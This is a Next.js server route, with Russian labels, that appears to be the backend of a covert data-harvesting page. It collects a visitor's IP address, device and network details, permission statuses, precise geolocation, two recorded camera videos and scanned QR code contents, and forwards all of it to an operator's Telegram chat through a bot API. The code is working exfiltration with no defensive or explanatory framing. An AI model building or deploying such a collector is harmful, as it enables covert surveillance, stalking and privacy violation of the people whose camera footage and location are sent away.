import { NextRequest, NextResponse } from "next/server";

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// Enum для типов сообщений, должен совпадать с фронтендом
enum MessageType {
  InitialSummary = "initial_summary",
  Video1 = "video1",
  Video2 = "video2",
  QrCode = "qr_code",
}

export async function POST(req: NextRequest) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error("Telegram bot token or chat ID is not set in environment variables.");
    return NextResponse.json(
      { error: "Telegram bot token or chat ID is not configured." },
      { status: 500 }
    );
  }

  try {
    const {
      messageType,
      timestamp,
      clientInfo,
      networkInfo,
      deviceMemory,
      batteryInfo,
      geolocation,
      video1,
      video2,
      qrCodeData,
      permissionStatus,
    } = await req.json();

    const ipAddress = req.headers.get("x-forwarded-for") || "Unavailable";
    const messages: Promise<Response>[] = [];

    switch (messageType) {
      case MessageType.InitialSummary:
        let summaryText = "📊 *Отчет о сессии*\n\n";
        if (timestamp) {
          summaryText += `*Время сессии:* ${new Date(timestamp).toLocaleString('ru-RU')}\n`;
        }
        summaryText += "\n--- 📱 *Информация об устройстве* ---\n";
        summaryText += `*IP:* \`${ipAddress}\`\n`;
        if (clientInfo?.platform && clientInfo.platform !== "Недоступно") {
          summaryText += `*Платформа:* ${clientInfo.platform}\n`;
        }
        if (clientInfo?.hardwareConcurrency && clientInfo.hardwareConcurrency !== "Недоступно") {
          summaryText += `*Ядра CPU:* ${clientInfo.hardwareConcurrency}\n`;
        }
        if (deviceMemory && deviceMemory !== "Недоступно") {
          summaryText += `*Память устройства:* ${deviceMemory} GB\n`;
        }
        if (clientInfo?.screenWidth && clientInfo.screenHeight) {
          summaryText += `*Разрешение экрана:* ${clientInfo.screenWidth}x${clientInfo.screenHeight}\n`;
        }
        if (clientInfo?.browserLanguage) {
          summaryText += `*Язык браузера:* ${clientInfo.browserLanguage}\n`;
        }
        if (batteryInfo?.level !== undefined && batteryInfo.status !== "Not Supported") {
          summaryText += `*Батарея:* ${(batteryInfo.level * 100).toFixed(0)}% (${batteryInfo?.charging !== undefined ? (batteryInfo.charging ? "Заряжается" : "Не заряжается") : "Неизвестно"}) [Статус API: ${batteryInfo?.status || "Неизвестно"}]\n`;
        } else if (batteryInfo?.status && batteryInfo.status !== "Available" && batteryInfo.status !== "Not Supported") {
          summaryText += `*Батарея:* ${batteryInfo.status}\n`;
        }

        summaryText += "\n--- 🌐 *Информация о сети* ---\n";
        if (networkInfo?.effectiveType && networkInfo.effectiveType !== "Недоступно") {
          summaryText += `*Тип соединения:* ${networkInfo.effectiveType}\n`;
        }
        if (networkInfo?.rtt !== undefined && networkInfo.rtt !== "Недоступно") {
          summaryText += `*RTT:* ${networkInfo.rtt} ms\n`;
        }
        if (networkInfo?.downlink !== undefined && networkInfo.downlink !== "Недоступно") {
          summaryText += `*Downlink:* ${networkInfo.downlink} Mbps\n`;
        }

        summaryText += "\n--- ✅ *Статус разрешений* ---\n";
        if (permissionStatus?.geolocation && permissionStatus.geolocation !== "Unknown") {
          summaryText += `*Геолокация:* ${permissionStatus.geolocation}\n`;
        }
        if (permissionStatus?.camera && permissionStatus.camera !== "Unknown") {
          summaryText += `*Камера:* ${permissionStatus.camera}\n`;
        }
        if (permissionStatus?.microphone && permissionStatus.microphone !== "Unknown") {
          summaryText += `*Микрофон:* ${permissionStatus.microphone}\n`;
        }

        messages.push(
          fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: summaryText, parse_mode: "Markdown" }),
          }).then(async res => {
            console.log("Summary message API response status:", res.status);
            if (!res.ok) { const errorBody = await res.text(); console.error("Summary message API error response:", errorBody); }
            return res;
          })
        );

        // Send Geolocation as a separate message if available
        if (geolocation?.latitude && geolocation?.longitude) {
          console.log("Attempting to send location...");
          messages.push(
            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendLocation`, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, latitude: geolocation.latitude, longitude: geolocation.longitude }),
            }).then(async res => {
              console.log("Location API response status:", res.status);
              if (!res.ok) { const errorBody = await res.text(); console.error("Location API error response:", errorBody); }
              return res;
            })
          );
        }
        break;

      case MessageType.Video1:
        if (video1) {
          console.log("Attempting to send Video 1...");
          const base64Data = video1.replace(/^data:video\/\w+;base64,/, "");
          const buffer = Buffer.from(base64Data, "base64");
          const formData = new FormData();
          formData.append("chat_id", TELEGRAM_CHAT_ID);
          formData.append("video", new Blob([buffer], { type: "video/webm" }), "recorded_video_1.webm");

          messages.push(
            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
              method: "POST",
              body: formData,
            }).then(async res => {
              console.log("Video 1 API response status:", res.status);
              if (!res.ok) { const errorBody = await res.text(); console.error("Video 1 API error response:", errorBody); }
              return res;
            })
          );
        }
        break;

      case MessageType.Video2:
        if (video2) {
          console.log("Attempting to send Video 2...");
          const base64Data = video2.replace(/^data:video\/\w+;base64,/, "");
          const buffer = Buffer.from(base64Data, "base64");
          const formData = new FormData();
          formData.append("chat_id", TELEGRAM_CHAT_ID);
          formData.append("video", new Blob([buffer], { type: "video/webm" }), "recorded_video_2.webm");

          messages.push(
            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
              method: "POST",
              body: formData,
            }).then(async res => {
              console.log("Video 2 API response status:", res.status);
              if (!res.ok) { const errorBody = await res.text(); console.error("Video 2 API error response:", errorBody); }
              return res;
            })
          );
        }
        break;

      case MessageType.QrCode:
        let qrMessage = "\n--- 🎥 *Медиа и QR* ---\n";
        if (qrCodeData) {
          if (qrCodeData === "QR Scan Timed Out") {
            qrMessage += `*QR-код:* Время сканирования истекло ⏳\n`;
          } else if (qrCodeData.startsWith("QR Scan Error:")) {
            qrMessage += `*QR-код:* Ошибка сканирования ❌ (${qrCodeData.replace("QR Scan Error: ", "")})\n`;
          } else {
            qrMessage += `*QR-код отсканирован:* Да ✅ (\`${qrCodeData}\`)\n`;
          }
        } else {
          qrMessage += `*QR-код отсканирован:* Нет ❌\n`;
        }

        messages.push(
          fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: qrMessage, parse_mode: "Markdown" }),
          }).then(async res => {
            console.log("QR Code message API response status:", res.status);
            if (!res.ok) { const errorBody = await res.text(); console.error("QR Code message API error response:", errorBody); }
            return res;
          })
        );
        break;

      default:
        console.warn("Unknown messageType received:", messageType);
        return NextResponse.json({ error: "Unknown message type" }, { status: 400 });
    }

    await Promise.allSettled(messages);

    return NextResponse.json({ message: "Data processed and sent to Telegram." });
  } catch (error: any) {
    console.error("Error processing Telegram request:", error);
    return NextResponse.json({ error: error.message || "Internal server error" }, { status: 500 });
  }
}